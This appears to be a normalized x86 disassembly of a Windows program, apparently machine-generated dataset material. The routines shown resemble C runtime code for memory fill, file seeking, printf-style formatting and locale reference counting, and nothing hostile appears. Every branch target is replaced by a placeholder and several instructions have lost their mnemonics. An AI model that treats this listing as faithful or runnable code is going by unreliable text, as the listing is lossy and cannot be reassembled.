mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_407040
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_4028d9
mov [ eax ] 0x9
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_402521
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_407094
push 0x18
push r--data
call sub_4021d0
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_4028a5
and [ eax ] 0x0
call sub_4028d9
mov [ eax ] 0x9
jmp r-xdata
call sub_4028a5
and [ eax ] 0x0
call sub_4028d9
mov [ eax ] 0x9
call sub_402521
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_409550
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_4028a5
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_407190
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_402215
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407166
mov edx ebx
jmp r-xdata
sub_407190
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_409664
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_4028d9
mov [ eax ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_4028b8
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_407203
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_402131
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_407249
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x44c ]
push ebx
push esi
mov [ ebp - 0x428 ] eax
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x408 ] eax
xor eax eax
mov ebx eax
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x454 ] eax
mov esi eax
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x42c ] eax
call sub_40281d
call sub_4028d9
mov [ ebp - 0x460 ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
mov edx [ ebp - 0x408 ]
test edx edx
je r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
cmp [ ebp - 0x440 ] bl
movzx edx [ edx ]
xor ecx ecx
mov [ ebp - 0x40c ] ecx
mov eax ecx
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x45c ] ecx
mov [ ebp - 0x41c ] edx
test dx dx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov [ ebp - 0x470 ] 0x58
mov [ ebp - 0x474 ] 0x64
mov [ ebp - 0x478 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x434 ]
test ecx ecx
je r-xdata
push 0x58
lea eax [ edx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
movzx eax dx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
cmp [ ebp - 0x440 ] 0x0
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov edi [ ebp - 0x434 ]
imul eax eax 0x9
movzx edi [ eax + edi + r--data ]
mov eax edi
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x410 ]
shr eax 0x4
mov [ ebp - 0x434 ] eax
cmp eax 0x8
je r-xdata
je r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_407e65 ]
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax dx
push 0x20
pop edx
sub eax edx
je r-xdata
push 0x2a
pop eax
cmp dx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp dx ax
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
mov [ ebp - 0x42c ] 0x1
push eax
push [ ebp - 0x428 ]
push edx
call sub_407e85
add esp 0xc
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
imul ecx [ ebp - 0x430 ] 0xa
movzx eax dx
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x430 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x430 ] eax
test eax eax
jns r-xdata
imul ecx [ ebp - 0x418 ] 0xa
movzx eax dx
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x418 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x410 ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov ecx [ ebp - 0x40c ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x414 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx edx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] edx
test dx dx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop edx
cmp eax edx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x414 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
or ebx 0x8000
mov [ ebp - 0x408 ] eax
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov edx [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp edx 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x410 ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x478 ]
je r-xdata
mov eax edi
add eax 0x4
and ebx 0xffff7fff
mov [ ebp - 0x408 ] eax
jmp r-xdata
mov [ ebp - 0x414 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
or ebx 0x1000
mov [ ebp - 0x408 ] eax
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x410 ]
add esi 0x4
mov [ ebp - 0x410 ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi edx
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x41c ] 0x10
pop eax
mov [ ebp - 0x454 ] eax
test bl bl
jns r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x410 ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x45c ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
lea esi [ ebp - 0x404 ]
or ebx 0x40
mov ecx 0x200
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x40c ] ecx
test eax eax
jns r-xdata
push 0x69
pop edx
cmp eax edx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x410 ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x414 ] ebx
push 0x20
pop eax
add edx eax
mov [ ebp - 0x458 ] 0x1
mov [ ebp - 0x41c ] edx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x42c ] 0x1
mov ecx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x40c ] ecx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_402bcd
xor eax eax
pop ecx
mov [ ebp - 0x45c ] eax
push 0x20
pop edx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub ecx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x460 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_407ee7
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push edx
call sub_407ebb
mov eax [ ebp - 0x424 ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax ecx
jle r-xdata
push 0x67
pop eax
cmp dx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov [ ebp - 0x410 ] edi
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x458 ]
movsx eax dl
push [ ebp - 0x418 ]
push eax
push [ ebp - 0x40c ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x410 ] edi
mov edi [ edi - 0x4 ]
call sub_401c58
test eax eax
je r-xdata
push 0x6f
pop edx
cmp eax edx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x40c ] ecx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x42c ] 0x1
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x464 ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x414 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x470 ]
je r-xdata
add ecx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_4082ba
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x42c ] 0x0
mov eax [ ebp - 0x40c ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax ecx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x414 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x414 ] ebx
cmp ecx eax
jae r-xdata
xor ecx ecx
mov [ ebp - 0x42c ] ecx
movsx ecx [ eax ]
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
mov ecx eax
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_408521
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ ecx ] ax
je r-xdata
mov ecx [ ebp - 0x40c ]
inc eax
inc ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x40c ] ecx
cmp ecx edi
jl r-xdata
inc eax
push [ ebp - 0x460 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_407ee7
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_407ebb
add esp 0x10
push 0x20
pop edx
mov [ ebp - 0x438 ] dx
mov [ ebp - 0x424 ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_402131
mov edx [ ebp - 0x41c ]
mov [ ebp - 0x45c ] eax
pop ecx
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x414 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar ecx 0x1
xor ecx ecx
lea esi [ ebp - 0x404 ]
inc ecx
jmp r-xdata
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x430 ]
mov eax [ ebp - 0x424 ]
sub edi ecx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x40c ] edi
jmp r-xdata
push esi
call sub_408310
pop ecx
mov ecx eax
jmp r-xdata
or ebx 0x100
inc esi
mov [ ebp - 0x414 ] ebx
jmp r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x424 ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_407ebb
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x464 ]
call sub_407e85
mov ecx [ ebp - 0x41c ]
add esp 0xc
add ecx [ ebp - 0x46c ]
mov eax [ ebp - 0x47c ]
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x410 ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_408630
add ecx 0x30
mov [ ebp - 0x47c ] ebx
mov [ ebp - 0x40c ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x47c ] eax
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x464 ]
push ecx
push eax
call sub_408521
add esp 0x10
mov [ ebp - 0x46c ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
dec esi
mov ecx [ ebp - 0x40c ]
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x414 ]
lea ecx [ ebp - 0x205 ]
sub ecx esi
inc esi
mov [ ebp - 0x40c ] ecx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test ecx ecx
je r-xdata
dec esi
inc ecx
push 0x30
pop eax
mov [ esi ] al
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_407e85
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_40839b
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
sub_407ebb
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_407e85
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_407ee7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
mov [ ebp + 0x18 ] eax
test [ edi + 0xc ] 0x40
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
dec ebx
push edi
movzx eax [ eax ]
push eax
call sub_407e85
mov eax [ ebp + 0x14 ]
add esp 0xc
add [ ebp + 0x8 ] 0x2
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_407e85
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_407f60
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
inc ecx
push edi
mov eax ecx
[ edx ] eax
mov esi [ edx + 0x78 ]
test esi esi
je r-xdata
mov esi [ edx + 0x80 ]
test esi esi
je r-xdata
mov eax ecx
[ esi ] eax
mov esi [ edx + 0x7c ]
test esi esi
je r-xdata
mov eax ecx
[ esi ] eax
mov esi [ edx + 0x88 ]
test esi esi
je r-xdata
mov eax ecx
[ esi ] eax
push 0x6
lea esi [ edx + 0x1c ]
pop ebx
mov eax ecx
[ esi ] eax
cmp [ esi - 0xc ] 0x0
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
add esi 0x10
dec ebx
jne r-xdata
mov edi [ esi - 0x4 ]
test edi edi
je r-xdata
mov eax ecx
[ edi ] eax
cmp [ esi - 0x8 ] rw-data
je r-xdata
mov eax [ edx + 0x9c ]
add eax 0xb0
[ eax ] ecx
inc ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ecx
[ edi ] eax
sub_407ff5
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
mov [ ebp + 0x8 ] eax
lea edi [ esi + 0x1c ]
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_402bcd
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_402bcd
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_402bcd
push [ esi + 0x88 ]
call sub_402bcd
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_409a7f
push [ esi + 0x9c ]
call sub_402bcd
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_402bcd
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_402bcd
push [ ebx ]
call sub_402bcd
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_402bcd
push [ esi + 0x84 ]
call sub_402bcd
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_402bcd
push [ esi + 0x84 ]
call sub_40991c
pop ecx
pop ecx
push eax
call sub_402bcd
pop ecx
push eax
call sub_402bcd
push [ esi + 0x84 ]
call sub_409a18
pop ecx
pop ecx
sub_40814f
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov eax edx
pop ebp
retn
push ebx
push esi
or esi 0xffffffff
push edi
mov eax esi
[ edx ] eax
mov ecx [ edx + 0x78 ]
test ecx ecx
je r-xdata
mov ecx [ edx + 0x80 ]
test ecx ecx
je r-xdata
mov eax esi
[ ecx ] eax
mov ecx [ edx + 0x7c ]
test ecx ecx
je r-xdata
mov eax esi
[ ecx ] eax
mov ecx [ edx + 0x88 ]
test ecx ecx
je r-xdata
mov eax esi
[ ecx ] eax
push 0x6
lea ecx [ edx + 0x1c ]
pop ebx
mov eax esi
[ ecx ] eax
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edi [ ecx ]
test edi edi
je r-xdata
add ecx 0x10
dec ebx
jne r-xdata
mov edi [ ecx - 0x4 ]
test edi edi
je r-xdata
mov eax esi
[ edi ] eax
cmp [ ecx - 0x8 ] rw-data
je r-xdata
mov ecx [ edx + 0x9c ]
add ecx 0xb0
[ ecx ] esi
dec esi
pop edi
pop esi
pop ebx
mov eax esi
[ edi ] eax
sub_4081ef
push 0xc
push r--data
call sub_4021d0
and [ ebp - 0x1c ] 0x0
call sub_40638a
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_402c45
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_40826f
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408266
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40638a
mov esi [ eax + 0x6c ]
mov eax esi
call sub_402215
retn
push 0x20
call sub_4019a1
sub_40826f
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
